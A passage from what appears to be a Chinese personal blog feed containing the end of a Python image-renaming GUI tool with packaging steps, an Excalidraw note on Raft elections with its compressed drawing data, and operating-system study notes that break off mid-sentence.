class="hljs-string">&#x27;.png&#x27;</span>, <span class="hljs-string">&#x27;.ico&#x27;</span>, <span class="hljs-string">&#x27;.bmp&#x27;</span>, <span class="hljs-string">&#x27;.gif&#x27;</span>&#125;<br><br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-comment"># Get and sort files</span><br>            files = [f <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> folder.iterdir() <span class="hljs-keyword">if</span> f.is_file() <span class="hljs-keyword">and</span> f.suffix.lower() <span class="hljs-keyword">in</span> valid_exts]<br>            files.sort(key=<span class="hljs-keyword">lambda</span> x: x.name.lower())<br><br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> files:<br>                <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;文件夹中没有可重命名的图片文件！&quot;</span>)<br><br>            <span class="hljs-comment"># Temporary renaming to avoid conflicts</span><br>            temp_files = []<br>            <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> files:<br>                temp_path = folder / (f.stem + <span class="hljs-string">&quot;_temp&quot;</span> + f.suffix)<br>                os.rename(f, temp_path)<br>                temp_files.append(temp_path)<br><br>            <span class="hljs-comment"># Final sequential renaming</span><br>            <span class="hljs-keyword">for</span> idx, temp_file <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(temp_files, start=<span class="hljs-number">1</span>):<br>                new_path = folder / <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;idx&#125;</span><span class="hljs-subst">&#123;temp_file.suffix.lower()&#125;</span>&quot;</span><br>                os.rename(temp_file, new_path)<br><br>            <span class="hljs-comment"># Success feedback</span><br>            <span class="hljs-variable language_">self</span>.feedback_label.configure(text=<span class="hljs-string">f&quot;已成功重命名 <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(temp_files)&#125;</span> 个文件！&quot;</span>, text_color=<span class="hljs-string">&quot;green&quot;</span>)<br>            messagebox.showinfo(<span class="hljs-string">&quot;完成&quot;</span>, <span class="hljs-string">f&quot;已成功重命名 <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(temp_files)&#125;</span> 个文件！&quot;</span>)<br><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-variable language_">self</span>.feedback_label.configure(text=<span class="hljs-string">f&quot;错误：<span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>, text_color=<span class="hljs-string">&quot;red&quot;</span>)<br>            messagebox.showerror(<span class="hljs-string">&quot;错误&quot;</span>, <span class="hljs-string">f&quot;重命名失败：<span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>)<br><br>        <span class="hljs-keyword">finally</span>:<br>            <span class="hljs-variable language_">self</span>.btn_sort.configure(state=<span class="hljs-string">&quot;normal&quot;</span>)  <span class="hljs-comment"># Re-enable button</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app = ImageRenamerApp()<br>    app.mainloop()<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>安装 customtkinter 依赖：</li></ol></blockquote><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">pip install customtkinter -<span class="hljs-selector-tag">i</span> https:<span class="hljs-comment">//pypi.tuna.tsinghua.edu.cn/simple</span><br></code></pre></td></tr></table></figure><hr><h2 id="2-打包为-exe"><a href="#2-打包为-exe" class="headerlink" title="2. 打包为 exe"></a>2. 打包为 exe</h2><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-comment"># 1. 安装打包工具</span><br>pip install pyinstaller<br><br><br><span class="hljs-comment"># 2. 打包代码</span><br>pyinstaller <span class="hljs-operator">-</span>-onefile <span class="hljs-operator">-</span>-windowed <span class="hljs-operator">-</span>-icon<span class="hljs-operator">=</span><span class="hljs-string">&quot;D:<span class="hljs-char escape_">\文</span>件集合<span class="hljs-char escape_">\I</span>CO<span class="hljs-char escape_">\重</span>命名排序.ico&quot;</span> <span class="hljs-operator">-</span>-distpath <span class="hljs-string">&quot;D:<span class="hljs-char escape_">\文</span>件集合&quot;</span> <span class="hljs-string">&quot;D:<span class="hljs-char escape_">\文</span>件集合<span class="hljs-char escape_">\重</span>命名排序.py&quot;</span><br><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">1. --onefile</span><br><span class="hljs-string">1. 打包为单个 .exe 文件。</span><br><span class="hljs-string">2. --windowed</span><br><span class="hljs-string">1. 确保 GUI 程序无控制台窗口</span><br><span class="hljs-string">3. --distpath &quot;</span>D:\文件集合\<span class="hljs-string">&quot;  &quot;</span>D:\文件集合\本地图库.py<span class="hljs-string">&quot;</span><br><span class="hljs-string">1. D:<span class="hljs-char escape_">\文</span>件集合<span class="hljs-char escape_">\ </span>是输出位置</span><br><span class="hljs-string">2. D:<span class="hljs-char escape_">\文</span>件集合<span class="hljs-char escape_">\本</span>地图库.py 是输入位置</span><br><span class="hljs-string">&quot;</span><span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><hr>]]></content>
    
    
    <categories>
      
      <category>自研小工具</category>
      
      <category>重命名排序小工具</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2025/06/15/%E7%AC%94%E8%AE%B0%EF%BC%9ARaft%20%E5%8D%8F%E8%AE%AE/firstTest/"/>
    <url>/2025/06/15/%E7%AC%94%E8%AE%B0%EF%BC%9ARaft%20%E5%8D%8F%E8%AE%AE/firstTest/</url>
    
    <content type="html"><![CDATA[<p>&#x3D;&#x3D;⚠  Switch to EXCALIDRAW VIEW in the MORE OPTIONS menu of this document. ⚠&#x3D;&#x3D; You can decompress Drawing data with the command palette: ‘Decompress current Excalidraw file’. For more info check in plugin settings under ‘Saving’</p><h1 id="Excalidraw-Data"><a href="#Excalidraw-Data" class="headerlink" title="Excalidraw Data"></a>Excalidraw Data</h1><h2 id="Text-Elements"><a href="#Text-Elements" class="headerlink" title="Text Elements"></a>Text Elements</h2><p>超时未收到心跳 ^EKZN2mE1</p><p>B 广播通知其他节点，<br>其他节点将为其投票<br>当 D 为其投票后，此时<br>票数已达到 3 票，超过<br>5&#x2F;2 已经可以成为 Leader<br>后续就无需再投票了 ^Ab1nykon</p><h2 id="Embedded-Files"><a href="#Embedded-Files" class="headerlink" title="Embedded Files"></a>Embedded Files</h2><p>d1cb86d25906c48d10fb75cd7cdd46e0a3cb6928: [[Pasted Image 20250615113544_566.png]]</p><p>016646ac4771f955fe44d8cad7b1a08dd4550b3c: [[Pasted Image 20250615114159_894.png]]</p><p>596950fb17b671af02f9afaf3b080ddf45a10880: [[Pasted Image 20250615114911_098.png]]</p><p>b6280a1c39dc0018db90245b80ecb8179a41a444: [[Pasted Image 20250615115314_930.png]]</p><p>%%</p><h2 id="Drawing"><a href="#Drawing" class="headerlink" title="Drawing"></a>Drawing</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs compressed-json">N4KAkARALgngDgUwgLgAQQQDwMYEMA2AlgCYBOuA7hADTgQBuCpAzoQPYB2KqATLZMzYBXUtiRoIACyhQ4zZAHoFAc0JRJQgEYA6bGwC2CgF7N6hbEcK4OCtptbErHALRY8RMpWdx8Q1TdIEfARcZgRmBShcZQUebQBGeISaOiCEfQQOKGZuAG1wMFAwYogSbghmAAkAdgAtAEkAFh4jekwANnjSTGYjADEAUR42epTiyFhEcsJ9aKR+EsxueIAG<br><br>Fe1GgGZVzYBOduaADnbdgFZ2hcgYbmceHiTTnhP4w8PG9qfG+NPLiAoSdTcRrVdaNfbVdqHFbVCFPXa/SQIQjKaTcHjVOLAzbtU6HU6JfHbX7WZTBbgrX7MKCkNgAawQAGE2Pg2KRytTrMw4LhAlkxiVNLhsLTlDShBxiEyWWyJByOFyeZkoPzIAAzQj4fAAZVgZIkgg8Koq1LpCAA6gDJOTtD8CgITfSdTA9egDWVfmKURxwjk0PFfmxudg1Nc/<br><br>WtfqLhHB6sRfahcgBdX6q8gZGPcDhCTW/QgSrDlWpUD3CCXe5hxzPZu0VBAIYjLN4wnibQ48Rq/RgsdhcNBPW3jBhMVicABynDE3E6mxBK3OFOrhGYABE0lA69xVQQwr9NCXiANghksnH8uNCnaSmUJAB5ABS5oGzkqmGU7SXkmvHAAVrUACoAQV2F8VRKSZxHQHkaSoC8AF9LnPM9ICvdBr0qWp9CMZRMC0TQhEkbAKEkDgACFVUqJdrngiZ4HA<br><br>iBILYaCzxgu0k2rIQ4GIXA13rP1qjBM4zmqbFw2rIgOFpDMs3wX4WWFdc0E3fBt2rKkuKEOMIEQCVc2UI11WCdMJFOfYzhWVVNHiapNHaap4lwVUVh4VVdns+zNk0FYoWIYhVUaU5cFWV4ViNZh3HA09xn9C94hY35sBpOBJM1Ao4IKIpLx49A2AADQABQARwZRpmEkeohDNTRTgobKl2YYhdnqeZqzA6ZZmUJqByWXt2m0XZdmqQ4+r2ASVk2Nt<br><br>flDVBnA+aptGqPqFubEF2lnX5/mIQE0BxHr4jOQ5Vl2dFTlxKKB0RZFUTQTYVh6ltPhWfYeHOD4LmrEkXXnAcqRpekpVZdlyHlbleWVHchRFMUJT+mV0DlBUQb0jVtV1Wi3XrSkHXNS0gQxn6ECdF0KmZd1q09IifWWAMgxDZYRIHSN2JjE9WIHFNcDTTLK2khc8y69BaiMI1IeIMsKykyla0y+JNmaFZLLGw4OyHbtuGM9tq07YcODHDgJz9XZ4<br><br>j83ZZ3iPgF2XVd5NQRTlIHXdxX3Q8lRPC90oHZCGEaw4hGvVV/2If8zX6WkKAAGQAaWvZR8oAcRA6ipgkejGPGVKzzdjLyjvB8nxfN8P2/P9AOAqjoBo8pk4gWDYrYjiuKtyz+OM85jmNmTcwktAuZktg5Mym2EAxtSNK0xwOF05MNQQQz0Dl9oDnaIVgVs5zjtVBBGkaYhDjwYgrLszzvL804Vk0TZsBCsK8mi+CYvGFmSniwMkvwFKFjd0pMog<br><br>Wp8qpYjNGyocWk7QKDh3aNeU45keCaGIAAVSNC1CQMw5hGj5tNL42goQfGltOQaN0zYDkms4YyoI+KOS+I0UaOJ+wlHWptVApwtgIiRCiZUvZ3jaHRJQ74fEoTbGBMSceH1cammhgDTkwMlRGkFMKBmUNmT/VlIDeGUjJ6agJqjYm6MVKYwtBtK0aB1g0PtHjDR5Q0ZC2EF6CmfoqZChpmGT6JQGbRljHkB+apUzT05uLHmxB8xJ3iJYh2osX4Sy<br><br>tscR4jxrrqwHJrFWV0hJKy7KOcc4FdrHBOIwjEOYLbBG4huLcg9qz2wlAedIztr7pwvEhL+9AvY+z9gHIOfQQ4RyjrHeOZdE4QVIFBKuTEa4DnYpxApvEm5nFxDLAhJQxKd1QN3USvd6T9yKUPKA6lyijx0ojAyX9iDxGwJoY4xAnrG3aNgRohwDlmU0NUU42A96POIO8BAKxcDn2sodQ4l8CDhRvtFIZj8EovzfmlBcdSVgwEIKQYgyhlAAH0Vz<br><br>5QRbApcod8Ch2cF+BkCDy5Jz6QxVBaJGGYN2HsWc7Q9gHDeLEkoRCtg9QWn1ToeJrrok2GtbGaBXhzQWocGEh19gCuMVIFhl1UDG20MNIag0aVbEVm9IR4EnEmNEQomGEAADE8QEC6t1dI8GcjJQavEUDRUfI1HI2dJow0Ij6R6PoUY+1+MUbmK0cE6x5ZKbVkDPY2AtNVUQBcUzdxyYvEz0We7XmFdNjBNLDY1AGdungR4HaNOJQwgN2bJsXEnk<br><br>rnJK1miaEhbuw6z1qgd4kJjqvEVe7PJCAxnWzWSUvc5SjzZCqeMDOCdaJrkwKDGpn9ygDHDrUEcPB9ADCCdXe+vwRn1ylnxPquJ9gtgLaJDuYSll90KUpYpA44BsFzJ2tAEVijnuKKqq9F4PFgEvWAXl80+oCvmjwYV9yqLOClTK8lcqrkKtvUCyA+BQhQCZPofQahuK5WPXyLuvivpRFIFAYiuYx66QQ1WAcmRiBoe0uPbdSGeRQH/ISwiIQfHY<br><br>ZKLhsjUFES4C/pXX4QRdwUCtgPMFxQP4e1HeOyd068U9OgFgQdnU0Tvs4X+ld2JpY8DrfSm4YJGjaBOAtbYmxc2b3hNWOhBjUCGyDedVhJLBGkhVS6sREgdV6ts4a2RwsrOw2UZIy11Z9LWsJhYl1jr9POp0aYt1+oPXFj8OTb1tjfXUwDY4iMYpXHM3DezbxRHLwxqTpsAAavGkWiao2ZsltwDExw5bHRmZAeJnBuC5tLak3W6TnjYnxJCXJK58<br><br>kcZbXbNtTtjypcgAuptjcV3HAxC2BTIGt1Ye5gOWSKy9221AqJ8ogBQ2MAG+mgAqc0AGymgAGJUAMP6gBn2KFpQX8S2JBra23tw7yZOBQC1IQIwqag2qhu30dmGpJqiv7aRogygezoDEFkJgRpOxQHMAQf8P2/sQCg95MkcUbu4FzEwGeDAoUwrhYi5FqL0WYuxbigMpBkS5gICdgdK2Ns7YO0aXAQgoBsAAErhHu+BakQgD2zKR5UcVbCDOcNOF<br><br>xhCmcJCbFIAi+nQhw6bFDtlRouA+hCEwJsIwPBah9EkGaITtExIdUWJOU4UmWzQl2IcTTxvN4TSU2CPlL69gDXRN8Ll+juCDVU2sKh2CHrTlFcZiVqxZq7RffESEuw/LbHK3RZV5JLOmus28jTQSwYOb3E56ALmLViZKB5sxwW7UBdNL5nGefHRBddCF0mVjwtxlOiUP1wYYsGbps4+Loaz0eIgGzDmfXSjpYgqcHLoS0DJsQbwdN4TMqTOunLc3<br><br>GtlZVe6pymfKTtZpO4MbXEUI56tctqs/dO5usVN61N+dddBvLr2v1GWLx27iS77Njru/qxHpPS7M8D7r1gBWLe+CD6XcrTWNiD3clT9GpP3BIflIPQaUPU2IDOdUSMDCDKDGQOsWDE9LvVSFDfDDDLvXDTAnZI/HREjOjBiBjKjabGjCUIgijRjUFYoDNHjL+LURoenU4Uja8a8TQZwWBenEcVwcOCgOAbAGOIQTXcobXYlNAEPVTD4J6LEE+LYZ<br><br>sC3NAZwZoaVJ4MaRheee5E3V6AcPTZ3XYV3f/eee4T3YAs6bnWmf3cA4PKA8Pd6CzIvRkGPdALVOPaWBPEpI1RzZw1PCRdPXZTzW1EmJDPGAvNAOlNVYvG1d1XPAcMmAfAzOxOvSaVYINENNxVvJLTvfA6NfxPmOidofvRNIffFEfVOMfZYY6PyTyYycPSrP7LYHTOJWfZferZYeaQ2AaU4CELfdrHfBbSAUpR2A/U9BZRDEoAbBuM/EhA2DEHQj<br><br>nG/HI2ZZZe/AYzSODUYy9N/KiT/M8O9B9fEThIPDTEPGERIRICI4oYyOaISfNShF6WyPiL/C8H/Awv/d3EwoA4xYoUAgPY3CAkPU4MPGA4oNvUDKkBA6DZAjYtA5DVDdDPAsY6jSAHAhEwjJY+0Qg8jEg7Aig7EyjGgsAOgiFcoGAaoGOEcAAWUlHEi2DNHDjgCgEaAl30A8hEIJX6V+D5nfRU08mNksn5LkJq2rCIWln132gOFnGnEDwUN025QM<br><br>zGiONnDWE6BsghGxGYQuh536lUzeCeF2jbGmU8jM2EUcJTxs31R10GK8OTx8LhlcwzzVCRmz1L1iMzV0XlP8xCNNBdKJjdMgHiMTWr0gFrwcQbzSObwyPjDbw7xSwxO7zyIrh+VCwTQiyTQvBTTRFHxUkKx5QOG0yuXG0HCXyBCLPqPLXAg+ELNbByXNja0bVWPZ0GP3w7TFmRIgEmKXQmXliBOqGv3mXyxAxWP6KbPWOfy7QvRqXf12NgNfxqWc<br><br>DkyVJPhuiDxhCpXmPGB1MhGaE6EOi2FlkOBBLADBPgIMEQJgxhPjPQPhII0wyRLIJRIlFwPRPvKHhQ0oJxPjNo3xOoI5KJRY3wDY0bIF3oNJOyigHp0aHoGYBjmjiXF2F/DNFIFVF/BDkqHgV+GHzonI3ENQDGnWF2i2DGj8j4hkMUKmlNlmj2CBMeF4UoTuD7LlKd3CNBBMIGk01nEOmNOrB921J6j1NWEeCpR4SLPsKjzNJ8ItLs0TwhltOlDN<br><br>RUTc1ZmdJLz9OCPdNCM9JtBdV9O83LzCwSODIgFDPr1SLiyjBb2jKyLjNfL8QCQgl2CKLTJKJ6TTXKJzKtma1WD9zqJaKBEYuaKXwrOWCDxGnGjrO33m1HKGPbUqXjM7PaO7P2j8iLLmVv2HKit+Cf0P3jBeKnJ2OeLnMQmUNYr9xN2ulqO4sQn2EwWaEErUJEqPJPIhLPKhOIBQPg1suIwwLRLvMHIwCfN6thKxPowJK/LxNGt/N6U5OrFYwYmA<br><br>toPfhJIkAQFqBjgRUOEpLgCEDYBHH/CEBF3wAoHoB4F/D6HynZOmv/OrD5hlh6nfX2GBDlk03eCYRFJuFNn11skSCoSEmejMNoXlKuVqp4DWDbBsnqs1JMwkP1xEvOBeBNzuHkxNIcO9N+kkstINRkuNRT3tP8KtV0rLzRqxmYtQC9I0p9NUr0riIr0MqSLDLMurHSMS3cwjVIJzB7zon/CcrjBctTWzK+lzMrW2AhC6I3OLKLXCIX0Cq1mCr9Hn<br><br>lWBOE+F6IbJHL3wdlipyv6oSvGRXQNjxHmlSsmy6uWN3QUk6xKGys2LysQmnMKvGAfWBr1LBveFslnHK2KDOASG6LxFZURruEPL2OAwgHBPA1aqQPasvJNsxJ6tvNxLwyGqvLhI/LGujoGoDh/KYxwoAqApHJAuWvQFVCXCEH0DeAZC/Hp12HDlDiy3F3DmwGyniByEwtKOwpmvE0SXWAxBuiuXBsGgNlFVFNzUwSD0oV7JlOlsBtJsNk2G9oGlO<br><br>OxGdqLN4tpiZWBHuJMm6IDpRvEuJvNMxqtIgBkVkodlxrTwRgJqpqJopodS0tFW+kpuiJz3UoDNpqDPptMsb0gGZrDVZuS0jXGKQk5twGIh5u4D5qzPcsFobiChbBBHCploSUlVFXLJXzQEYRlm2DNxVqbQHnVrKR61GO1pPymO7LX3uH7PSrNubQf0PQ2JfwdvyqnPtsnMQhnrnsgKEm3NBvGx+Jul6nXpuk3oxHkyapklPMgzao6p536uvOfL6<br><br>sAfTvkeGvfMzvjpTqmrbuupw0AvmrzsWvBXdi/n/Asg4BgFpCqxbuEy+1wvxDiEIruH2CnAxACsUyUN2lnqN3XwvyElNknsgD0N7GnBuL6mhDuG2ieiht9xPh3sMWj3kuswPvsxPvkQSecz8IvvcxUqftdJfuNE0tJvJsiNdRybUu0RpoMvfqi39RSK/uDUjJZtZjZq73Q3sronx30tTLbIfJrE8vuVBoxCD1qz+2ouGbloM0slnHuTDxwcbPweG<br><br>NbK7x1oM2mIXp2EofjLvzVualO3QGIlQEAH89QAWpNAAsBMAFP3QAN0VAA1uUACCgwATodAAYf4AB0OBrn7nAAwHUAC45C5wAVKNAALTxecAGV9VAJcVAb5/5wAOBUHnAATa1Wxeb+cAAdTQAJ91AA++O2zwtQD+YeeW0AHH4l504WIVAJFwAeb9AB75UAFO5QABCNPnUBQ5KMmAXmIXABbv0AEYdQAA9NAAAdMAFjFf5wAMLkjsKBScecIB9njn<br><br>zm3nHmXmJWvnfmAWOBgXQXwW/moXYX4XkW0WMWsXcX8XCWSWKXqXaX6XSBGXWXOWeW/n+Xrssg7sHti0rWoBXsoN8APtMLRMIdkQodghVRHTizQd3B3Xft2Rn54cshEdvRSAAH2zWQicOASddmRXDnTnLnbnJXXmU2ZX/mgWQWwXZWVW4WOBEXUX0XNhMXsW8WOACWeAiWyWqWaW6XGMGWOBmX2XuW+XqdacGcmdbW0BWdRztcuctTlg+d86jHyh<br><br>CpMslxVRMtNBNB6dJBbwY5/x2g2BmAABNXyW8H1rC5BdqXC6aA4VTMhZcqtTJcihct4Oaa6FabYY6TyVUx3ehR4JIG9tcqsyyHoniiwoJ2aE3IEzyRx94XNOwyPOJiStJ3w81TJu2G00+u08+1RLJ9RK+/0/J/PO+nS5DvJwMtMoyky2piMiyqMxMayyNnp1p/I3AJcMBq8oWgUkPeeTeMsvy3sM4MZtBhvRevEYVWZ7ZrrDWwhhh7jIdD2VCdCT<br><br>CbCGdvCAiIiUiciSiIdLCyuWdUE4/UZUhvW7o4SINNKzZjK822h904eLZXDHZNRGyo+j4KEAKbAPYYgbANYF4YgTQY2NsU4Y5FYBAI5faeaXAL4XzzeX5F0S9YMsAO+FT6sJ+RKKbEdoXdAepBAb2X2f2QOYOMOSOaOOOKx2iZjG6j60GzhJ4SEIPJ6KlFsJotxqaMEdYaZEEE3APADB9/TUKzhKlTyI3CEfqCIsVQd3sG0NQz3A4bur4AVWJsm+<br><br>JxRFwhyHeNYZJnGuDjJhD5SpD0p6mm+km+hLrh+qIrza+1+ypnDj+/D8yxmIjmM5p+M8jiuAYaj9Ms8TM3sAWgrbNEECheTJjksiQoy1Btoq6Q6aWPhcPRces3Bi25s/jkY7p1TxdRKjTqlfqbT42/qrZzKx/ehic+9Jh22lhjHthk4Fr66KEeaDrviL9OIIS66clQb0G4b6oMRuAlqyRiO6RlRm8rAwfDMtIDtFHH+P+ABIBEBMBCBKBGBDCjM5<br><br>7bATZJQgi/EIEw2K5HEWya6Q2eCYNXAKL3gJIWWd4VsV29EKlWnqB8ghOuO9nu7znpUFHHKAqIqEqMqCqKqGqOqBqK0tUXuSXsmhIXaAPZ6TyXaYyPYFX5QNXiTbQUaN4PqJsLEF4A3gx7q0jNR8ajOyarO9umjXR9jfRokpa0dm8e8M0R8Z8V8d8T8H8ACICCeZqVunLjuvCzoDYbohVM4L4DU96pQoDzhaceQsPbJEtJi+hJIbcjTMaZsSEdQ/<br><br>x7r6GhU597c/90aT60boNLbpw8DrVKb+z4KbG7w8DvGqDzPbJnblDpfsIytDDlb3biAbDqvQ7wNY7hLX+pp/+9muyijvoG7iBh7w3gQWjvYIKNsINeo2mF9xaLjMoQJ8c4DEh44o8+OBDCHksxIZdlYercBHosTTrI99OaxK2oJxx5ng7aexb/CAV1JbAcEdwRemPyojuFpUM/VsHPyeh08ZsEjc8tCVQJJ0SMyjU3joxGKW88ohUYqKVHKiVRqo<br><br>tUeqI1BAjt43ecYZwOsCnyPApSXvfBHP1cbOJg+V0dYNQOhCUJDctFQOrHyN5sDbuHArnl/CqB1AmgLQNoJ0G6C9BBgwwUYCr3F7u8CKzYe4B4zbCUJ9ouCQPsoIMyPcY68fZPuowT5XUiws1dPgtSz6GNYuEAUThhCwg4QpOhEEiGRAoiXUtGwQmvq2Dmig0VoJkE3PNGFKEIbgQkG0CqVGiUp5oJsRrmiENiXtuG9VYSuHhXroNQ+QlaPjyUoQ<br><br>YguuYlUDnvUkpr8Zum/OShNwg6KUfWWeTDuUzW7H9NumMQmih0v4+oBweHG/kzQab39M853NOpdyTiZdOmuWZyhmWHxuUdBX/CJEJH1JrB3uktSVOVwqzAD2OfEToCfCA6QD0B0VFsnFTTrLMhsAkTTn/g2aoC9ONDDAWjzPQ20cBBVPAWCPGC3BqhXDASu7XqFfp9cCI1oSHnaFtg6BsyBgVIyjqyM4Seg5NObyyAo5jBDQZoK0A6BdAeg/QIYC<br><br>MFEH2CJBjg/EPcVSK8JIQLWDMkH3V6WQ5oqwZoH1E3hVd7g/OT/ko0Tr6C0+nAr+OO0nbTtZ287RdsuzXYbtHSrvCXoyO9oVVjcMIShKcV2iKDv6XgxINKi17eVzgT0Bij4ONAjViCqdfqt+X8F/k0hafXOlFRSjgAWYdEOAHAB1D1xwGBQaAIiAyCiFB2CwBgIQAQAUBiIMHVJkMNX6qgExCY/kBAAl59ILea4fQDqDxjmk+hG/AMamJBj1AMx0<br><br>YpPLB237wclKkAAsemPSB9B9+QRCYSmJECFiMxWYtDqTTpRNi0xxI1sTMPGHJjqxPY9IPTjfoHd8xzYmsfoGvDRYju447sVACLG1iXsb2Z1qrDDGDiFxGYvoDdhtaPZ1xE4ocfoCFYBtPWCAb1gOIPGbj0gvo1Ro6JNpdiWx6QAYBNVtGaNq+VYy8YuP0CUFfwrdYWMmNCg0hNQ2UIrPcgSB8RzivvPUq4wqBPxNQq7IrJJmXLXsuOrwARAGKMBs<br><br>ADA/ouJAQDZzWgzgAuB8ZOJHEhJE0F/PcMmNFAkBdxdrAMdROIA6gEA6vGhPUxICUk2A/iZ8bgE0DBBeO39QnCajSYfxiIzIL+KQGUCCgAAFPcD7Ia85Jsk6gB71OAABKI0IzmUBZgeQ5QCSdJObAUheA10JSfpKUlGI1JREjcW2PpDTjQcnASHgGNjKM48whOF8h/EyA8S+J3AXtnFCIDq9vJ1YWNsGJ7akA2cAYWnGIWCls4iJdgL8J52yBahY<br><br>2cADiVxNja8S5mAYoUKDkYC/gsJ+AHCaBFbphBgg2AWyVwDijqQ6cR40okj0BF4NWaBgLUGkBKlIM6p9AqkP+GanZTcphJZiOEKdLBBeazEGCEAA<br></code></pre></td></tr></table></figure><p>%%</p>]]></content>
    
    
    
    <tags>
      
      <tag>excalidraw</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>笔记：操作系统理论</title>
    <link href="/2025/06/03/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/"/>
    <url>/2025/06/03/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/</url>
    
    <content type="html"><![CDATA[<ol><li>操作系统的特征<ol><li>并发、共享、异步、虚拟</li></ol></li><li>操作系统的功能<ol><li>处理器管理、存储器管理、文件管理、设备管理</li></ol></li><li>进程的特性<ol><li>动态、并发、独立、异步、结构</li></ol></li><li>死锁产生的原因<ol><li>系统资源的竞争、进程推进顺序非法</li></ol></li><li>死锁产生的必要条件<ol><li>互斥、不剥夺、请求并保持、循环等待</li></ol></li><li>解除死锁</li><li>进程的定义<ol><li>进程（Process），是计算机中的程序关于某个数据集合的一次运行活动，是系统进行 <strong>资源分配和调度</strong> 的一个基本单位，我们简单理解为：一个进程就是一个程序在操作系统中实际运行时的一个实例</li></ol></li><li>死锁的定义<ol><li>死锁是指多个进程因竞争资源而相互等待，导致彼此陷入阻塞状态，若无外力干预，这些进程将永远无法继续执行。</li></ol></li><li>内存分区分配的时候，四种适应算法的优缺点<ol><li>首次适应<ol><li>实现简单，查找效率较高，从头开始搜索空闲分区链表，一旦找到足够大的空间就分配</li><li>可能导致低地址空间碎片化，因为这里会留下很多小的、不可用的分区；分配速度虽然快，但可能导致后续的分配需要遍历更长的列表</li></ol></li><li>最佳适应<ol><li>尝试找到最接近所需大小的分区进行分配，理论上可以最大化地利用内存</li><li>需要遍历整个空闲分区列表来寻找最佳匹配，这增加了分配时间；容易产生大量非常小的难以再利用的碎片</li></ol></li><li>最坏适应<ol><li>总是选择最大空闲分区进行分配，尽可能留下大的剩余空间，便于后续大进程的分配</li><li>实际上可能造成大的空闲块被分割成多个中等大小的碎片，浪费空间；而且需要遍历整个空闲表，查找效率较低</li></ol></li><li>临近适应<ol><li>与首次适应类似，但从上一次分配结束的位置继续向后查找，提高了遍历效率，避免总从头开始搜索</li><li>在空闲分区不均匀分布时可能会跳过合适区域，导致整体内存利用率下降；</li></ol></li></ol></li><li>内存的分配方式有，分别怎么储存信息<ol><li>单一连续分配</li><li>固定分区分配</li><li>动态分区分配</li><li>分页</li><li>分段</li><li>段页</li></ol></li><li>处理机的调度方式<ol><li>先来先服务</li><li>短作业优先</li><li>高响应比优先</li><li>时间片轮转</li></ol></li><li>文件分配方式<ol><li>连接</li><li>链接</li><li>索引</li></ol></li><li>FCB 是什么，作用是什么<ol><li>FCB 是操作系统为每一个文件维护的<strong>结构化信息集合</strong>，用于记录文件的各种属性与存储信息。</li><li>FCB 